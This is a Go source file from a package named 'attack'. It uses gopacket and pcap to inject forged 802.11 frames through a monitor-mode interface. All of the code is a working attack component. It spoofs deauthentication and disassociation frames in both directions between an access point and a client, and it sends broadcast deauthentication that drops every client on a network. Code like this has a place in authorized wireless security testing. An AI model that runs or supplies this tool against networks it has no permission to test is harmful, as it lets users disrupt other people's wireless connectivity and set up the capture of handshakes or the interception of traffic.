package attack

import (
	"fmt"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// Injector handles raw 802.11 frame injection via pcap.
type Injector struct {
	handle *pcap.Handle
	iface  string
}

// NewInjector opens a pcap handle for packet injection on a monitor-mode interface.
func NewInjector(iface string) (*Injector, error) {
	handle, err := pcap.OpenLive(iface, 65536, true, pcap.BlockForever)
	if err != nil {
		return nil, fmt.Errorf("open pcap for injection on %s: %w", iface, err)
	}

	return &Injector{
		handle: handle,
		iface:  iface,
	}, nil
}

// Close closes the pcap handle.
func (inj *Injector) Close() {
	if inj.handle != nil {
		inj.handle.Close()
	}
}

// SendDeauth sends a deauthentication frame from src to dst via the given BSSID.
func (inj *Injector) SendDeauth(bssid, client net.HardwareAddr, reason layers.Dot11Reason) error {
	// Client -> AP deauth (kicks client off)
	frame, err := buildDeauthFrame(client, bssid, bssid, reason)
	if err != nil {
		return err
	}
	if err := inj.handle.WritePacketData(frame); err != nil {
		return fmt.Errorf("inject deauth (client->AP): %w", err)
	}

	// AP -> Client deauth (tells client it's kicked)
	frame, err = buildDeauthFrame(bssid, client, bssid, reason)
	if err != nil {
		return err
	}
	if err := inj.handle.WritePacketData(frame); err != nil {
		return fmt.Errorf("inject deauth (AP->client): %w", err)
	}

	return nil
}

// SendBroadcastDeauth sends a broadcast deauthentication frame.
func (inj *Injector) SendBroadcastDeauth(bssid net.HardwareAddr, reason layers.Dot11Reason) error {
	broadcast := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

	frame, err := buildDeauthFrame(bssid, broadcast, bssid, reason)
	if err != nil {
		return err
	}

	return inj.handle.WritePacketData(frame)
}

// SendDisassociate sends a disassociation frame.
func (inj *Injector) SendDisassociate(bssid, client net.HardwareAddr, reason layers.Dot11Reason) error {
	frame, err := buildDisassocFrame(bssid, client, bssid, reason)
	if err != nil {
		return err
	}
	if err := inj.handle.WritePacketData(frame); err != nil {
		return fmt.Errorf("inject disassoc: %w", err)
	}

	frame, err = buildDisassocFrame(client, bssid, bssid, reason)
	if err != nil {
		return err
	}
	return inj.handle.WritePacketData(frame)
}

// buildDeauthFrame constructs a raw 802.11 deauthentication frame with RadioTap header.
func buildDeauthFrame(addr1, addr2, addr3 net.HardwareAddr, reason layers.Dot11Reason) ([]byte, error) {
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	err := gopacket.SerializeLayers(buf, opts,
		&layers.RadioTap{},
		&layers.Dot11{
			Address1: addr1,
			Address2: addr2,
			Address3: addr3,
			Type:     layers.Dot11TypeMgmtDeauthentication,
		},
		&layers.Dot11MgmtDeauthentication{
			Reason: reason,
		},
	)
	if err != nil {
		return nil, fmt.Errorf("serialize deauth frame: %w", err)
	}

	return buf.Bytes(), nil
}

// buildDisassocFrame constructs a raw 802.11 disassociation frame.
func buildDisassocFrame(addr1, addr2, addr3 net.HardwareAddr, reason layers.Dot11Reason) ([]byte, error) {
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	err := gopacket.SerializeLayers(buf, opts,
		&layers.RadioTap{},
		&layers.Dot11{
			Address1: addr1,
			Address2: addr2,
			Address3: addr3,
			Type:     layers.Dot11TypeMgmtDisassociation,
		},
		&layers.Dot11MgmtDisassociation{
			Reason: reason,
		},
	)
	if err != nil {
		return nil, fmt.Errorf("serialize disassoc frame: %w", err)
	}

	return buf.Bytes(), nil
}
